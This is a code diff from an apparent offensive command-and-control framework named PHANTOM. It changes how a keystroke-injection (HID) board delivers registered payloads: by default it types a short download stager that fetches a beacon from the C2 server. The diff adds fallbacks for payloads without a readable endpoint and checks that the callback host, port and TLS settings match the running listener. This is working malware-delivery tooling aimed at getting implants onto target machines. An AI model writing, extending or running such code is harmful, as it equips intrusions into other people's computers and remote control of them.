@@ -269,11 +269,15 @@ class PayloadModule(BaseModule):
         Command source — exactly one:
           "<command>"       the literal command the board types.
           --from-payload <id>
-                            type the command `generate` already built and
+                            use the command `generate` already built and
                             registered (see `payloads`). The id may be a
                             unique prefix; an unknown or ambiguous id is
                             refused and the inventory is listed, and the
-                            payload's platform must match --type-into.
+                            payload's platform must match --type-into. By
+                            DEFAULT the short download stager for that
+                            payload's own endpoint is typed (see
+                            --stager-mode); --stager-mode inline types the
+                            registered command itself.
           --stager <os>     build the PHANTOM stager for that OS with the
                             current C2 endpoint and type THAT.
 
@@ -310,14 +314,16 @@ class PayloadModule(BaseModule):
                           Both modes fetch the SAME artefact from the same
                           C2 route, so switching does not change what lands
                           on the target.
-                          --from-payload is the exception to the default:
-                          there `inline` stays the default and means "type
-                          the command that already exists", which is what
-                          that path has always done. Pass --stager-mode
-                          download with --from-payload and it reads the
-                          endpoint the registered payload was BUILT for and
-                          types a short fetcher instead, so an 11.4k
-                          registered command does not get typed either.
+                          It applies to --from-payload too, and there it is
+                          the default as well: download reads the endpoint
+                          the registered payload was BUILT for and types a
+                          short fetcher, so an 11.4k registered command does
+                          not get typed either. A registered command with no
+                          readable endpoint cannot be fetched from: it is
+                          then typed AS REGISTERED, with a warning, because
+                          a default must not dead-end. Asking explicitly
+                          (--stager-mode download, or --stager-attempts) is
+                          an ERROR in that case instead of a fallback.
           --stager-attempts <n>
                           how many times the download stager's retry loop
                           may try before it gives up and EXITS (default:
@@ -552,21 +558,18 @@ class PayloadModule(BaseModule):
                            "it with --from-payload.")
             return
         if not stager_mode_given:
-            # HID DEFAULT for --stager: the board types a FETCHER and the C2
-            # serves the beacon. The channels that paste a command (generate,
-            # exploit, c2) never reach this flag — nothing is typed for them,
-            # so an inline one-liner costs them nothing and their default is
-            # unchanged. `--from-payload` keeps ITS documented default (the
-            # registered command), because on that path the command already
-            # exists: download there is available, not assumed.
-            stager_mode = "inline" if from_payload else "download"
+            # HID DEFAULT for BOTH sources: the board types a FETCHER and the
+            # C2 serves the beacon. The channels that paste a command
+            # (generate, exploit, c2) never reach this flag — nothing is typed
+            # for them, so an inline one-liner costs them nothing and their
+            # default is unchanged. `--from-payload` matters most here:
+            # reusing a registered payload (generate once, type many) is how
+            # HID is actually used, and typing its 11.4k command was the
+            # exact cost this mode exists to remove.
+            stager_mode = "download"
         if stager_attempts and stager_mode == "inline":
             notifier.error("--stager-attempts configures the DOWNLOAD "
-                           "stager's retry loop, and inline has no loop." +
-                           (" This --from-payload has no --stager-mode, so it "
-                            "is about to type the registered command: pass "
-                            "--stager-mode download for a retry budget to "
-                            "mean anything." if from_payload else ""))
+                           "stager's retry loop, and inline has no loop.")
             return
         if stager_attempts and not (stager or from_payload):
             notifier.error("--stager-attempts configures the DOWNLOAD "
@@ -642,39 +645,65 @@ class PayloadModule(BaseModule):
             # re-pointed at this session's config.
             from phantom.utils import short_stager as ss
             endpoint = ss.endpoint_from_registered_command(command)
+            # A registered command can be unfetchable for two different
+            # reasons and both are named rather than merged into one shrug.
             if not endpoint:
-                notifier.error(
-                    f"payload {from_payload} carries no C2 endpoint I can "
-                    f"read, so a download stager cannot be built for it. "
-                    f"Use --stager-mode inline to type it as registered.")
-                return
-            host, port, use_ssl = endpoint
-            command = _download_stager(payload_platform, host, port, use_ssl,
-                                       stager_attempts)
-            if not command:
-                return
-            notifier.info(
-                f"download stager for the registered "
-                f"{payload_platform or 'unknown'} payload: {len(command)} "
-                f"chars typed, fetching from the endpoint it was built for "
-                f"({'https' if use_ssl else 'http'}://{host}:{port})")
+                why = "carries no C2 endpoint I can read"
+            elif payload_platform == "android":
+                why = "is an Android payload, which is an HTTP channel, not HID"
+            elif not ss.download_route(payload_platform):
+                why = (f"is registered as {payload_platform!r}, a platform with "
+                       f"no download route")
+            else:
+                why = ""
+            if why:
+                # Two very different reasons to be here: the operator ASKED for
+                # a fetcher (a command that cannot back one is an error), or
+                # download is merely the DEFAULT and this entry was hand-made
+                # or hosted elsewhere (then typing it as registered, loudly,
+                # is still delivery). A default that can dead-end is worse
+                # than a long command.
+                if stager_mode_given or stager_attempts:
+                    notifier.error(
+                        f"payload {from_payload} {why}, so a download stager "
+                        f"cannot be built for it. Use --stager-mode inline to "
+                        f"type it as registered.")
+                    return
+                notifier.warn(
+                    f"payload {from_payload} {why}, so there is nothing to "
+                    f"fetch: its command is typed AS REGISTERED "
+                    f"({len(command)} chars). Regenerate it with `generate` "
+                    f"for a short download stager, or pass --stager-mode "
+                    f"inline to say so explicitly.")
+            else:
+                host, port, use_ssl = endpoint
+                command = _download_stager(payload_platform, host, port,
+                                           use_ssl, stager_attempts)
+                if not command:
+                    return
+                notifier.info(
+                    f"download stager for the registered "
+                    f"{payload_platform or 'unknown'} payload: {len(command)} "
+                    f"chars typed, fetching from the endpoint it was built for "
+                    f"({'https' if use_ssl else 'http'}://{host}:{port})")
         if stager:
             if target and target != stager:
                 notifier.error(
                     f"--stager {stager} but the board types into {target}: "
                     f"one artefact, and PE ≠ ELF ≠ Mach-O — pick one.")
                 return
-            from phantom.utils import config as cfg
-            from phantom.utils.network import c2_use_ssl
-            host = session.lhost or self._get_lhost()
-            port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
-            # TLS is CONFIGURATION, not a constant. A dropper built with a
-            # literal `True` against an HTTP listener says https://, fetches
-            # nothing, and spends its whole retry budget on a port that was
-            # never going to answer — invisibly. The live listener decides
-            # when one is running; `c2.ssl` otherwise.
-            use_ssl = c2_use_ssl()
+            from phantom.utils.network import c2_endpoint_status
+            # ONE source of truth for the endpoint this artefact will call
+            # back to, and whether anything is listening there. TLS is
+            # CONFIGURATION, not a constant, and the PORT is compared too: a
+            # board pointed at a port the listener is not on types its whole
+            # command, reports success and never gets a beacon — the failure
+            # this command was least able to show anyone.
+            ep = c2_endpoint_status(host=session.lhost or self._get_lhost())
+            host, port, use_ssl = ep.host, ep.port, ep.use_ssl
             scheme = "https" if use_ssl else "http"
+            for problem in ep.warnings():
+                notifier.warn(problem)
             if stager_mode == "download":
                 # The board types every character ON SCREEN, which is the
                 # whole reason this branch exists: the inline Windows stager
